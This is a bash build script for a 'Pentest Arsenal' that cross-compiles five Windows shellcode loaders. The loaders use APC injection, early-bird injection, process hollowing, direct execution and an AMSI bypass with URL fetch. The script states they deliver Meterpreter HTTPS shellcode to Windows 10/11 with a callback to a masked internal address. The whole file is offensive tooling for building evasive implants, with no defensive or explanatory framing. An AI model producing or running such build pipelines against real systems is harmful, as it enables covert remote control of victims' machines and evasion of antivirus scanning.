#!/bin/bash

echo "[+] ======================================="
echo "[+] Building COMPLETE Pentest Arsenal"
echo "[+] ======================================="

# Verify prerequisites
[[ ! -f shellcode.h ]] && { echo "❌ ERROR: shellcode.h missing! Run: python3 ../../encode_shellcode.py"; exit 1; }
[[ ! -f shellcode.bin ]] && { echo "❌ ERROR: shellcode.bin missing!"; exit 1; }

echo "[+] ✅ Shellcode verified: $(wc -c < shellcode.h) chars"

# Build each loader individually
echo ""
echo "[+] Building apc.exe (APC Injection)..."
x86_64-w64-mingw32-g++ apc.cpp -o apc.exe -static -O2 -lcrypt32 -lgdi32 -ladvapi32 -luser32

echo "[+] Building earlybird.exe (APC + Sleep)..."
x86_64-w64-mingw32-g++ earlybird.cpp -o earlybird.exe -static -O2 -lcrypt32 -lgdi32 -ladvapi32

echo "[+] Building classic.exe (Process Hollowing)..."
x86_64-w64-mingw32-g++ classic.cpp -o classic.exe -static -O2 -lcrypt32 -lgdi32 -ladvapi32 -lntdll

echo "[+] Building original.exe (Direct Execution)..."
x86_64-w64-mingw32-g++ original.cpp -o original.exe -static -O2 -lcrypt32

echo "[+] Building mokingjay.exe (AMSI Bypass + URLFetch)..."
x86_64-w64-mingw32-g++ mokingjay.cpp -o mokingjay.exe -static -O2 -lcrypt32 -lgdi32 -luser32 -ladvapi32 -lurlmon -lshell32

echo ""
echo "[+] ======================================="
echo "[+] ARSENAL STATUS:"
ls -lh *.exe 2>/dev/null | grep -E '\.exe$' || echo "No executables found"
echo "[+] ======================================="
echo "[+] All loaders use your Meterpreter HTTPS shellcode"
echo "[+] Target: Windows 10/11 | Callback: 10.XXX.XX.XXX:443"
